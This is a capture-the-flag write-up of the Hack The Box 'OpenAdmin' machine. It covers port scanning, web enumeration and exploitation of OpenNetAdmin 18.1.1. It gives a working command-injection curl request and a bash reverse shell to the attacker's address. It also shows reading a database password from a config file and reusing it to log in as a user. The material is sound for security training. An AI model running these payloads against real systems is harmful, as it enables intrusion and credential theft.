![image](https://github.com/jon-brandy/hackthebox/assets/70703371/850ebdb0-48db-483c-92cb-ef6ed405c839)# OpenAdmin
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9908a103-8c8b-4771-bb74-0bf955c31f61)


## Lessons Learned:
- Using dirsearch to enumerate webpages.
- Exploiting OpenNetAdmin (ONA) v.18.1.1 --> Remote Code Execution, Command Injection.

## STEPS:
> PORT SCANNNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sV -sC openadmin.htb --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-05 20:41 PDT
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.019s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)
|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)
|_  256 dcadca3c11315b6fe6a489347c9be550 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
```

1. Based from the nmap results, the machine runs web application at port 80 and opens ssh login at port 22.
2. Noticed based from the service's detail, once we open the webapp it shall rendered Ubuntu Default Page.

> WEB DEFAULT PAGE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/061c4f0e-2d71-4aa9-a168-99436176d7df)


3. Knowing this condition, seems the approach is to do directory listing.

> RESULT USING DIRSEARCH

```
dirsearch -u http://openadmin.htb:80
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a74ba915-39d9-418d-a4bf-26bde6d2a304)


4. Interesting! We found 2 accessible endpoint.

> Accessing /music/

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1f38ff98-6fa1-425e-8788-53856e547961)


5. Long story short, after reviewing every feature. Figured out that login feature shall redirect us to `/ona` endpoint.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4c9b4311-3f21-42bf-bc44-71ababe5b4a7)


> Accessing /ona/


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f16362b7-372d-40c6-ba05-34704060d1a7)


6. By checking for documentation, turns out ONA is an abbreviation of **OpenNetAdmin**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/45440e69-a7b4-4781-9f26-697aaed46333)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/44663749-8bbf-49eb-b6fd-d9e97afc4f98)


7. Noticed, it disclosed the service's version --> `18.1.1`. Using `searchsploit` or internet to find vuln related to this version, found these results:

> Internet

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5ab29c1d-0c5f-4864-8f4d-4347e780176c)

> Searchsploit

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/11ea3f32-2360-42de-99f2-886496b844f1)


8. It's remote code execution, also there's github POC's which can be useful (it speed up our exploit to drop a shell).
9. Anyway, let's use the exploit from exploit.db first.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/680d056a-3507-48d7-a5b0-fd42fe46fe17)


10. We just need to replace the CMD and URL.

```txt
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" http://openadmin.htb:80/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/722b8bc0-ee83-410a-8c12-ed38fe052568)


11. Awesome, we can do reverse shell from this state. Now let's use the github POC to speed up our process to drop a shell.

> Using the github POC

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/401f15c8-7ea3-4d2a-a60a-c69ba78b8e7e)


12. Noticed we a got a shell as `www-data`, which means in order to obtain the user flag, we need to swtich to a legitimate user account.
13. Anyway I am not too comfortable using shell from the Github POC, let's do reverse shell on our own. Let's use bash.

> PAYLOAD

```txt
bash -c 'bash -i >%26 /dev/tcp/tun0/1337 0>%261'
```

> IMPLEMENTATION

```txt
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";bash -c 'bash -i >%26 /dev/tcp/10.10.14.29/1337 0>%261';echo \"END\"&xajaxargs[]=ping" http://openadmin.htb:80/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0d6873a0-f74e-4a4e-b140-ab3e56638b91)


14. Traversing to `/home` directory to check users registered in this machine. Found 2 users namely **jimmy** and **joanna**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ef5a2c80-db6f-4d45-885f-a77d4b5684b6)


15. Upon reviewing the userinfo at ONA dashboard, identified it uses mysql and the host is local.
16. Hence let's traverse to the webapp location --> `/var/www/html/ona`.
17. Checking the `/local/config` found file --> `database_settings.inc.php` which should be our interest.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b737d855-08f8-4bcc-b17f-5ef8f676ccdc)


18. Found the db password of `ona_sys` --> `n1nj4W4rri0R!`.  However we can't open mysql in the machine. At this condition, we can speculate a password reuse to a certain user.
19. After tried for both, turns out **jimmy** using the same password as the DB.

> LOGGED IN AS JIMMY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1d18e759-41db-4e91-ae2e-361e1873bda9)


20. Great!
